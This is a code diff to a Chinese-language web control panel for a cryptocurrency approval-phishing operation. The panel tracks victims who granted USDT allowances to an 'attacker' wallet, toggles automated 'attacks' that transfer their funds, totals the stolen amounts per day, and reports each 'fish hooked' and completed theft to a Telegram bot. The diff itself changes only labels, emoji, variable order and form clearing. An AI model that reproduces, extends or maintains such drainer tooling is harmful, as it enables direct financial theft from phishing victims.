@@ -2,7 +2,7 @@
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>🌟 EOA 控制台 v1.7.1【启用日報 + 總額紀錄】</title>
+  <title>🌟 EOA 控制台 v1.7.2【돌解重新進入問題 + 繼續攻擊支援】</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     body { font-family: 'Arial'; padding: 20px; background: #fff; }
@@ -21,13 +21,13 @@
   </style>
 </head>
 <body>
-  <h2>🌟 EOA 控制台 v1.7.1 （启用日報 + 總額紀錄）</h2>
+  <h2>🌟 EOA 控制台 v1.7.2 (繼續攻擊 + 提示更新)</h2>
   <p><b>目前登入帳號：</b><span id="account">--</span></p>
   <button onclick="connect()">🔑 點我登入 MetaMask</button>
   <p><b>身份驗證：</b><span id="auth" class="bad">未驗證</span></p>
   <p><b>攻擊者 USDT 餘額：</b><span id="mybalance">--</span></p>
   <p><b>最後刷新時間：</b><span id="refresh">--</span></p>
-  <p><b>總約總額：</b><span id="total">0 USDT</span></p>
+  <p><b>統計總額：</b><span id="total">0 USDT</span></p>
   <p><b>自動攻擊狀態：</b><span id="mode" class="bad">已停用</span></p>
   <button onclick="toggleAuto()">🔄 切換自動攻擊</button>
   <p id="notify"></p>
@@ -60,11 +60,11 @@
 
     let provider, signer, sender;
     let totalStolen = ethers.BigNumber.from("0");
+    let todayTotal = ethers.BigNumber.from("0");
+    let todayDate = new Date().toLocaleDateString("zh-TW", { timeZone: "Asia/Taipei" });
     let autoEnabled = false;
     const attackedSet = new Set();
     const knownApprovals = new Set();
-    let todayDate = new Date().toLocaleDateString("zh-TW", { timeZone: "Asia/Taipei" });
-    let todayTotal = ethers.BigNumber.from("0");
 
     async function connect() {
       provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -123,7 +123,7 @@
 
     async function notifyNewApproval(addr) {
       document.getElementById("notify").innerText = `🌀 新授權地址：${addr}`;
-      const text = `🐟 上魚\n👤 地址：${addr}\n🕐 時間：${new Date().toLocaleString()}\n✅ 已授權給攻擊者`;
+      const text = `🐟 上魚\n👤 地址：${addr}\n🕒 時間：${new Date().toLocaleString()}\n✅ 已授權給攻擊者`;
       fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -141,7 +141,7 @@
       todayTotal = todayTotal.add(ethers.utils.parseUnits(amount, 6));
       const totalTodayStr = ethers.utils.formatUnits(todayTotal, 6);
       const time = now.toLocaleString("zh-TW", { timeZone: "Asia/Taipei" });
-      const text = `☑️攻擊完成\n👤 地址：${addr}\n🕐 時間：${time}\n💰 金額：${amount} USDT\n📈 今日總額：${totalTodayStr} USDT\n🔗 https://etherscan.io/tx/${txHash}`;
+      const text = `☑️攻擊完成\n👤 地址：${addr}\n🕒 時間：${time}\n💰 金額：${amount} USDT\n📈 今日總額：${totalTodayStr} USDT\n🔗 https://etherscan.io/tx/${txHash}`;
       fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -168,6 +168,8 @@
       }
       attackedSet.add(victim);
       await notifyAttackSuccess(victim, formatted, tx.hash);
+      document.getElementById("victim").value = "";
+      document.getElementById("balance").innerText = "";
     }
 
     async function steal() {
